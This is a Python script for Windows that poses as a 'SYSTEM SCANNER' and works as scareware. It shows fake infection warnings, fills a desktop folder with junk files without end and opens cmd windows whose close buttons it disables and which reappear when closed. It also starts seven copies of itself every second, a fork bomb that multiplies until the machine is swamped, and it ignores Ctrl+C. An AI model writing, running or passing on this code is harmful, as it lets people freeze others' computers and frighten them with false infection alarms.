import os
import subprocess
import time
import ctypes
from ctypes import wintypes
import tkinter as tk
from tkinter import messagebox
import threading
import shutil
import getpass
import sys
import random

# Constants
SWP_NOSIZE = 0x0001
SWP_NOMOVE = 0x0002
HWND_TOPMOST = -1
GWL_STYLE = -16
WS_DISABLED = 0x08000000

# Get script path
script_path = os.path.abspath(sys.argv[0])

# Initialize console
os.system('title SYSTEM SCANNER')
os.system('mode con: cols=100 lines=30')

# Create virus folder on desktop
username = getpass.getuser()
virus_folder = f"C:\\Users\\{username}\\Desktop\\VIRUS"
os.makedirs(virus_folder, exist_ok=True)

# Create fake "virus" files
for i in range(1, 6):
    with open(f"{virus_folder}\\virus_file_{i}.txt", "w") as f:
        f.write(f"This is not a real virus (file {i})\n" * 100)

# Color definition
LIGHT_YELLOW = "\033[38;2;238;250;75m"

# Console ASCII art
print(LIGHT_YELLOW + r"""
                                    ███                                    
                                    ███                                    
                                   █████                                   
                                  ███████                                  
                                 █████████                                 
                                 █████████                                 
                                ███████████                                
                               █████████████                               
                                ███████████                                
                                    ███                                    
                                    ███                                    
                                    ███                                                                      
                                    ████                                   
                                    ████                                   
                                   █████                                   
                                 ██     ██                                 
                              ███  █████  ███                              
                           ███   █████████   ███                           
                          ██  ███████████████  ██                          
                          ██ █████████████████ ██                          
                          ██ █████████████████ ██                          
                          ██ █████████████████ ██                          
                          ██ █████████████████ ██                          
                         ████ ████████████████ ███                         
                      ████████   █████████    ███████                      
                    █████████████   ███   █████████████                    
         ████    ██████          ███   ███          ██████    ████         
       █████████████                ███                █████████████       
      ███████████                                         ███████████      
     ████████████                                         ████████████     
   ██████████████                                         ██████████████   
  ██████████████                                           ██████████████  
 ███████                                                           ███████""")

def center_console():
    """Center the console window on screen"""
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    
    console_handle = kernel32.GetConsoleWindow()
    if not console_handle:
        return

    # Get screen dimensions
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)

    # Get console dimensions
    console_rect = wintypes.RECT()
    user32.GetWindowRect(console_handle, ctypes.byref(console_rect))
    console_width = console_rect.right - console_rect.left
    console_height = console_rect.bottom - console_rect.top

    # Calculate centered position
    x = (screen_width - console_width) // 2
    y = (screen_height - console_height) // 2

    # Move window
    user32.SetWindowPos(console_handle, 0, x, y, 0, 0, SWP_NOSIZE)

center_console()

def show_warning_popup():
    """Show a warning popup"""
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showwarning("CRITICAL WARNING", "SYSTEM INFECTION DETECTED!\n\nEmergency scan initiated.")
    root.destroy()

def make_window_unclosable(hwnd):
    """Make a window unclosable by disabling the close button"""
    try:
        # Remove close button
        style = ctypes.windll.user32.GetWindowLongA(hwnd, GWL_STYLE)
        ctypes.windll.user32.SetWindowLongA(hwnd, GWL_STYLE, style & ~0x80000)
        
        # Disable window
        ctypes.windll.user32.EnableWindow(hwnd, False)
    except:
        pass

def run_cmd(title, command, x, y, width=600, height=400):
    """Run a cmd window with specified command at position"""
    while True:
        try:
            proc = subprocess.Popen(['cmd', '/k', command], shell=True)
            
            # Find and position the window
            def find_window():
                EnumWindows = ctypes.windll.user32.EnumWindows
                EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
                GetWindowText = ctypes.windll.user32.GetWindowTextW
                GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
                IsWindowVisible = ctypes.windll.user32.IsWindowVisible

                def foreach_window(hwnd, lParam):
                    if IsWindowVisible(hwnd):
                        length = GetWindowTextLength(hwnd)
                        buff = ctypes.create_unicode_buffer(length + 1)
                        GetWindowText(hwnd, buff, length + 1)
                        if title in buff.value:
                            # Set window position and make it topmost
                            ctypes.windll.user32.SetWindowPos(
                                hwnd, HWND_TOPMOST, x, y, width, height, 0
                            )
                            make_window_unclosable(hwnd)
                            return False  # Stop enumeration
                    return True

                EnumWindows(EnumWindowsProc(foreach_window), 0)

            # Try to find the window several times
            for _ in range(10):
                find_window()
                time.sleep(0.2)
            
            proc.wait()
            time.sleep(1)
        except:
            time.sleep(1)

def replicate_self():
    """Create new instances of this script"""
    while True:
        try:
            # Open 7 new instances per second
            for _ in range(7):
                subprocess.Popen(['python', script_path], shell=True)
            time.sleep(1)
        except:
            time.sleep(1)

# Window configurations
window_configs = [
    ("SYSTEM PROCESS SCAN", "tasklist", 50, 50),
    ("NETWORK CONNECTIONS", "netstat -ano", 700, 50),
    ("RUNNING SERVICES", "sc query", 50, 300),
    ("ACTIVE TCP CONNECTIONS", "netstat -n", 700, 300),
    ("SYSTEM INFO", "systeminfo", 50, 550),
    ("DISK USAGE", "wmic logicaldisk get size,freespace,caption", 700, 550),
    ("PROCESS TREE", "wmic process get name,processid,parentprocessid", 50, 800),
    ("SCHEDULED TASKS", "schtasks /query /fo LIST /v", 700, 800),
    ("VIRUS SCAN", f"dir /s {virus_folder}", 400, 400)
]

# Show warning popup
threading.Thread(target=show_warning_popup, daemon=True).start()

# Start
threading.Thread(target=replicate_self, daemon=True).start()

# Start all CMD windows in separate threads
for title, command, x, y in window_configs:
    threading.Thread(target=run_cmd, args=(title, command, x, y), daemon=True).start()

# Keep adding files to virus folder
def grow_virus_folder():
    while True:
        try:
            new_file = f"{virus_folder}\\infection_{random.randint(1000,9999)}.tmp"
            with open(new_file, "w") as f:
                f.write("SYSTEM COMPROMISED\n" * 100)
            time.sleep(0.3)
        except:
            time.sleep(1)

threading.Thread(target=grow_virus_folder, daemon=True).start()

# Keep main thread running
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nINFECTION PROTOCOL ACTIVE - CANNOT BE STOPPED")
    while True:
        time.sleep(1)